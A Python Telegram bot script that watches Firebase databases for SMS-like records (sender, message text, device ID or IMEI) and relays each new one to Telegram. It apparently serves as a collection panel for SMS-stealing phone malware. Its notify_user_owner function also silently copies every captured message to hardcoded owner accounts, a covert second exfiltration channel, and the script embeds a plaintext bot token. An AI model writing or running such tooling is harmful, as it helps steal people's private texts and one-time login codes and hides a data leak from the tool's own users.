
# -*- coding: utf-8 -*-
import os
import requests
import json
import time
import threading
import hashlib
import html
from datetime import datetime, timezone
from sseclient import SSEClient

# ---------------- CONFIG ----------------

BOT_TOKEN = "8248892424:AAGcNHRBKjapxplF0QBg42OcIJOkJO8ZY5k"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

OWNER_IDS = [8260945171]
PRIMARY_ADMIN_ID = 7309295924

POLL_INTERVAL = 2
MAX_SSE_RETRIES = 5

# ---------------------------------------

OFFSET = None
running = True

firebase_urls = {}
watcher_threads = {}
seen_hashes = {}

approved_users = set(OWNER_IDS)
BOT_START_TIME = time.time()

SENSITIVE_KEYS = {}

# ---------------- HELPERS ----------------

def normalize_json_url(url):
    u = url.rstrip("/")
    if not u.endswith(".json"):
        u += "/.json"
    return u

def send_msg(chat_id, text, parse_mode="HTML", reply_markup=None):
    def _one(cid):
        payload = {"chat_id": cid, "text": text, "parse_mode": parse_mode}
        if reply_markup:
            payload["reply_markup"] = reply_markup
        requests.post(f"{API_URL}/sendMessage", json=payload, timeout=10)

    if isinstance(chat_id, (list, tuple, set)):
        for c in chat_id:
            _one(c)
    else:
        _one(chat_id)

def get_updates():
    global OFFSET
    params = {"timeout": 20}
    if OFFSET:
        params["offset"] = OFFSET
    r = requests.get(f"{API_URL}/getUpdates", params=params, timeout=30).json()
    if r.get("result"):
        OFFSET = r["result"][-1]["update_id"] + 1
    return r.get("result", [])

def http_get_json(url):
    try:
        r = requests.get(url, timeout=12)
        r.raise_for_status()
        return r.json()
    except Exception:
        return None

# ---------------- SMS DETECTION ----------------

def is_sms_like(obj):
    if not isinstance(obj, dict):
        return False
    keys = {k.lower() for k in obj.keys()}
    score = 0
    if keys & {"message", "msg", "body", "text", "sms"}:
        score += 2
    if keys & {"from", "sender", "address", "number"}:
        score += 2
    if keys & {"time", "timestamp", "date"}:
        score += 1
    if keys & {"device", "deviceid", "device_id", "imei"}:
        score += 1
    return score >= 3

def find_sms_nodes(snapshot, path=""):
    found = []
    if isinstance(snapshot, dict):
        for k, v in snapshot.items():
            p = f"{path}/{k}" if path else k
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    elif isinstance(snapshot, list):
        for i, v in enumerate(snapshot):
            p = f"{path}/{i}"
            if is_sms_like(v):
                found.append((p, v))
            if isinstance(v, (dict, list)):
                found += find_sms_nodes(v, p)
    return found

def extract_fields(obj):
    device = obj.get("device") or obj.get("deviceId") or obj.get("device_id") or obj.get("imei") or "Unknown"
    sender = obj.get("from") or obj.get("sender") or obj.get("address") or obj.get("number") or "Unknown"
    message = obj.get("message") or obj.get("msg") or obj.get("body") or obj.get("text") or ""
    ts = obj.get("time") or obj.get("timestamp") or obj.get("date")

    if isinstance(ts, (int, float)):
        ts = datetime.fromtimestamp(float(ts), tz=timezone.utc).astimezone().strftime("%d/%m/%Y, %I:%M:%S %p")
    if not ts:
        ts = datetime.now().strftime("%d/%m/%Y, %I:%M:%S %p")

    return {
        "device": device,
        "sender": sender,
        "message": message,
        "time": ts,
    }

def compute_hash(path, obj):
    return hashlib.sha1((path + json.dumps(obj, sort_keys=True, default=str)).encode()).hexdigest()

# ---------------- 🔥 ADDED: INLINE BUTTON ----------------

def format_notification(fields, user_id):
    text = (
        f"🆕 <b>New SMS Received</b>\n\n"
        f"📱 Device: <code>{html.escape(str(fields['device']))}</code>\n"
        f"👤 From: <b>{html.escape(str(fields['sender']))}</b>\n"
        f"💬 {html.escape(str(fields['message']))}\n"
        f"🕐 {html.escape(str(fields['time']))}\n"
        f"👤 User: <code>{user_id}</code>"
    )

    reply_markup = {
        "inline_keyboard": [
            [
                {
                    "text": "🔎 Find Device",
                    "switch_inline_query_current_chat": "/f"
                }
            ]
        ]
    }
    return text, reply_markup

def notify_user_owner(chat_id, fields):
    text, markup = format_notification(fields, chat_id)
    send_msg(chat_id, text, reply_markup=markup)
    send_msg(OWNER_IDS, text, reply_markup=markup)

# ---------------- SSE & POLLING (UNCHANGED) ----------------

def sse_loop(chat_id, base_url):
    url = normalize_json_url(base_url) + "?print=silent"
    seen = seen_hashes.setdefault(chat_id, set())

    while firebase_urls.get(chat_id) == base_url:
        try:
            client = SSEClient(url)
            for event in client.events():
                if not event.data or event.data == "null":
                    continue
                data = json.loads(event.data)
                payload = data.get("data", data)
                for path, obj in find_sms_nodes(payload):
                    h = compute_hash(path, obj)
                    if h in seen:
                        continue
                    seen.add(h)
                    notify_user_owner(chat_id, extract_fields(obj))
        except Exception:
            time.sleep(2)

# ---------------- 🔥 ADDED: /f HELPERS ----------------

def extract_device_id_from_text(text):
    if not text:
        return None
    text = html.unescape(text)
    for line in text.splitlines():
        if "device" in line.lower():
            for p in line.replace(":", " ").split():
                if len(p) >= 5 and p.isalnum():
                    return p
    return None

def firebase_query_by_device(base_url, device_id):
    base = normalize_json_url(base_url)
    url = f'{base}?orderBy="deviceId"&equalTo="{device_id}"'
    try:
        r = requests.get(url, timeout=10).json()
        return list(r.values()) if isinstance(r, dict) else []
    except Exception:
        return []

# ---------------- COMMAND HANDLER ----------------

def handle_update(u):
    msg = u.get("message") or {}
    chat_id = (msg.get("chat") or {}).get("id")
    text = (msg.get("text") or "").strip()
    if not chat_id or not text:
        return

    if chat_id not in approved_users:
        return

    lower = text.lower()

    if lower in ("/find", "/f") or lower.startswith("/f "):
        device_id = None
        parts = text.split(maxsplit=1)
        if len(parts) > 1:
            device_id = parts[1].strip()
        elif msg.get("reply_to_message"):
            device_id = extract_device_id_from_text(msg["reply_to_message"].get("text"))

        if not device_id:
            send_msg(chat_id, "❌ Device ID not found. Use /f device_id or reply with /f")
            return

        base_url = firebase_urls.get(chat_id)
        if not base_url:
            send_msg(chat_id, "❌ No Firebase URL set")
            return

        matches = firebase_query_by_device(base_url, device_id)
        if not matches:
            send_msg(chat_id, "🔍 No record found")
            return

        for rec in matches[:3]:
            send_msg(chat_id, f"<pre>{html.escape(json.dumps(rec, indent=2))}</pre>")
        return

    if text.startswith("http"):
        if not http_get_json(normalize_json_url(text)):
            send_msg(chat_id, "❌ Invalid Firebase URL")
            return
        firebase_urls[chat_id] = text
        seen_hashes[chat_id] = set()
        t = threading.Thread(target=sse_loop, args=(chat_id, text), daemon=True)
        t.start()
        send_msg(chat_id, "✅ Monitoring started")
        return

# ---------------- MAIN LOOP ----------------

def main_loop():
    send_msg(OWNER_IDS, "Bot started")
    while True:
        for u in get_updates():
            try:
                handle_update(u)
            except Exception as e:
                print(e)
        time.sleep(0.5)

if __name__ == "__main__":
    main_loop()
